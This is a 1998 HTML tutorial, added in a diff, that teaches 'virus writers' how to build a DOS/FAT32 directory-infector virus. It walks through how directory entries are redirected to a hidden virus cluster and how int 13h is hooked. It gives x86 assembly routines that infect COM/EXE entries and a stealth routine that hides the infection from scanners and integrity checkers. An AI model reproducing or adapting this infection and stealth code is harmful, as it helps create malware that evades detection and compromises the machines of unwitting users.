@@ -1,0 +1,251 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Directory Infection [Buz/FS]</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<P align="center"> <font color="#004080"><b><font size="+3">Directory Infection 
+  </font><br>
+  <font size="+1">Buz [FS] </font></b></font></P>
+<hr>
+<P> <b>Introduction. </b></P>
+<P>
+	Greetings, virus writers. This tutorial is intended at readers with
+some knowledge of assembly language and low-level disk structures on the IBM
+PC compatible computers. I hope to provide you with the information necessary
+to write the most esoteric class of viruses out there - directory infectors.<BR>
+	Why directory infection, you may ask? First of all, it's the
+challenge - only two directory infectors have been written to my knowledge.
+Secondly, both of these have enjoyed high success in the wild. And finally,
+directory infection offers a chance to implement stealth algorithms at the
+lowest level - bypassing any anti-virus scanner or puny scanner-wannabe
+integrity checker. So, without further ado, on with the show.
+</P>
+<P> <b>How Directory Infectors Work. </b></P>
+<P>
+	This is known by a surprisingly few virus writers, even though this
+technology has been made public by VirusSoft Corp. in 1991 and later
+distributed very widely by the 40Hex magazine. Dir-II, the virus in question
+wouldn't work on DOS versions higher than 4.x, but despite that made it into
+the wild in huge numbers. This kind of spread is unique to directory
+infectors, as they do not decrease the available disk space, nor slow down
+the host computer significantly, and yet can infect any file accessed in any
+way - even if it was just brought up by a DIR command.<BR>
+	Technically, these viruses are unique - they do not modify any
+executable code in the host system. Rather, they modify the directory entry
+in a way that points to the single copy of the virus stored on the disk.
+To illustrate this, here's the format of DOS a directory entry (from Ralph
+Brown's Interrupt List)
+</P>
+<blockquote>
+  <PRE>
+Offset  Size    Description
+ 00h  8 BYTEs   blank-padded filename
+*08h  3 BYTEs   blank-padded file extension
+*0Bh	BYTE	attributes
+&gt;0Ch    BYTE    reserved
+&gt;0Dh    BYTE    10-millisecond units past creation time below (DOS 7)
+ 0Eh	WORD	file creation time (DOS 7)
+ 10h	WORD	file creation date (DOS 7)
+&gt;12h    WORD    last access date (DOS 7)
+#14h	WORD	high part of starting cluster number (FAT32)
+ 16h	WORD	time of creation/last update(Win9x)
+ 18h	WORD	date of creation/last update(Win9x)
+#1Ah	WORD	starting cluster number (FAT12/16)/low part thereof (FAT32)
+ 1Ch	DWORD	file size
+
+Key:
+
+* - data referenced during infection
+# - data changed during infection
+&gt; - data overwritten during infection
+</PRE>
+</blockquote>
+<P>
+This key refers to an algorithm I have developed, which isn't significantly
+different from that implemented by Dir-II or Byway, but is more compatible
+with Windows 95/DOS 7, and works on FAT32 drives.
+</P><P>
+	Now, how the hell do we infect? This has to be done rather carefully.
+First of all, when the virus first goes resident on the host system, it must
+find a nice safe spot to hide. This spot must be in an area of the disk
+referenced by the FAT - this means on a disk cluster boundary. One approach
+would be to mark this cluster bad in the FAT and write the virus body there.
+Two important considerations - that cluster number must be stored somewhere
+in the virus body, and there must be a marker of some sort so that the disk
+won't be reinfected. After this is done, the virus is free to load up the
+root directory, scan through it, and find any files it would like to infect.<BR>
+	Now that the virus has been installed, it only needs to hook int 13h
+(it can be int 26h or int 40h depending on your whim), and check the disk
+read buffer and write buffer. Directories, just like any other type of file,
+start on a cluster boundary. It's also known that the size of each directory
+entry is 20h bytes. All you have to do is check whether the 3 bytes at offset
+[start_of_direntry+3] match the executable extensions you want to infect, and
+if so, infect them. Below follows the algorithm for infecting a directory
+entry. It assumes the disk read/write buffer in es:bx
+</P>
+<blockquote>
+  <PRE>
+;-----code-fragment-start-----
+
+check_dir:
+	push	es
+	pop	ds
+	lea	si,[bx+8]       ;ds:si = file extension
+	cld                     ;set direction to increment
+	mov	cx,num_entries  ;sectors read*10h (calculate this yourself)
+
+check_ext:
+	lodsw                   ;get first two characters
+	cmp	ax,'OC'         ;COM?
+	jnz	check_ext2
+	lodsb
+	cmp	al,'M'          ;if so, verify that
+	jz	check_attrib    ;then, check if this entry is infectable
+	sub	si,3
+	lodsw                   ;else get the first two characters again
+
+check_ext2:
+	cmp	ax,'XE'         ;EXE?
+	jnz	next_entry
+	lodsb
+	cmp	al,'E'          ;verify it
+	jz	check_attrib
+
+next_entry:
+	lodsw                   ;1 byte shorter than inc si, inc si
+	jmp	short go_dir_check
+
+check_attrib:
+	lodsb                   ;get attributes
+	and	al,1010b        ;this means we have a Win9x long file name
+	jz	infect_entry    ;directory entry, a directory, or a system
+                                ;file
+go_dir_check:
+	add	si,1ch          ;next dir entry
+
+loop_dir_check:
+	loop	check_ext
+	jmp	short infect_done
+
+infect_entry:
+	mov	di,si
+	lea	si,[di+8]       ;si=low starting cluster number
+	lodsw                   ;get the number
+	xor	ax,0666h        ;encrypt it (necessary metal reference)
+	stosw                   ;place it elsewhere
+	lea	di,[si-2]
+	mov	ax,word ptr cs:[clustnum]       ;virus starting cluster
+	stosw                                   ;and store it in the entry
+	sub	si,0ah          ;si=high starting cluster
+	sub	di,0ah
+	lodsw
+	xor	ax,'FS'         ;had to put in a plug for my group ;-)
+	stosw                                   ;save that elsewhere
+	mov	ax,word ptr cs:[clustnum+2]     ;load 
+	stosw                                   ;point it to the virus
+	add	si,12h                          ;si=next extension
+	jmp	short loop_dir_check            ;and return to the loop
+
+infect_done:
+
+;now write the disk buffer to where it was read from, run your stealth
+;algorithm over the infected entries, and return control (if read)
+;else, just allow the write ;-)
+
+;------code-fragment-end------
+</PRE>
+</blockquote>
+<P>
+	Okay, the stealth algorithm. This must be used whenever there are
+infected directory entries are in the read buffer. Read the original starting
+cluster data from where it was saved, write it to its original location, and
+clear the fields that were overwritten (except for offset 12h, just stick
+whatever value is in offset 18h there). Simple, no? Just for reference,
+here's the algorithm. By the way, it's quite necessary for the purposes of,
+for instance, allowing programs to execute as normal, since DOS reads in the
+directory entries for the programs it executes. 
+</P>
+<blockquote>
+  <PRE>
+;-----code-fragment-start-----
+stealth_dir:
+	push	es
+	pop	ds
+	lea	si,[bx+1ah]     ;si=low starting cluster number
+	cld
+	mov	cx,num_entries  ;as above
+
+stealth_chk:
+	lodsw
+	cmp	ax,word ptr cs:[clustnum]       ;check if it's the virus's
+	jz	stealth_chk2
+	add	si,1eh
+	jmp	short stealth_loop              ;if not, get the next entry
+
+
+stealth_chk2:
+	sub	si,0ah                     ;si=high starting cluster number
+	lodsw
+	cmp	ax,word ptr cs:[clustnum+2]     ;check if it's the virus's
+	jz	stealth_entry
+	add	si,24h
+
+stealth_loop:
+	loop	stealth_chk        ;if not, keep going through the entries
+	jmp	short stealth_done
+
+stealth_entry:
+	lea	di,[si-2]
+	sub	si,0ah
+	lodsw                   ;get original low cluster number in ax
+	xor	ax,0666h        ;decrypt
+	stosw
+	lodsw                   ;shorter than add si,4
+	lodsw
+	lodsw                   ;get original high cluster number in ax
+	xor	ax,'FS'         ;decrypt ;-)
+	mov	di,si
+	stosw	
+	sub	di,4
+	lodsw
+	lodsw
+	movsw                   ;restore last access date
+	sub	di,8
+	xor	ax,ax
+	stosw                   ;clear the other fields
+	add	si,20h
+	jmp	short stealth_loop
+
+stealth_done:
+
+;	[.....]
+;	[.....]
+
+;------code-fragment-end------
+</PRE>
+</blockquote>
+<P>
+	So, this is how to infect directory entries. I'm not going to write
+code for anything else, but to run the host file, just build an exec
+parameter block, extract the name out of the PSP, and re-execute the program.
+Naturally, after the program finishes up, it will pass control back to you,
+so you can gracefully terminate. This is easy. Final words of wisdom: don't
+go around dumbly infecting the directory entries with the same values. If the
+disk changes, make sure you stick the right numbers into the clustnum
+variable and write a copy of the virus to that disk. Anyway, this is more
+than enough info to get you all going.
+</P>
+<P> <b><font size="-1">This document is (c) 1998 Buz [FS], and may be distributed 
+  so long as the correct copyright of this document is stated, and it is not modified 
+  in any way. Any medium in which this document is distributed in must be free. 
+  </font></b></P>
+<P><font size="-1"><b> The code presented in this document is (c) 1998 Buz [FS], 
+  and may be freely used and modified so long as the author of the base code is 
+  acknowledged and the copyright of the code is stated. If said code is used in 
+  a compiled binary form where no other copyright notice is stated, the copyright 
+  need not be included. All code is used at own risk. Any medium in which this 
+  code is distributed must be free. </b></font></P>
+
+</BODY>
+</HTML>
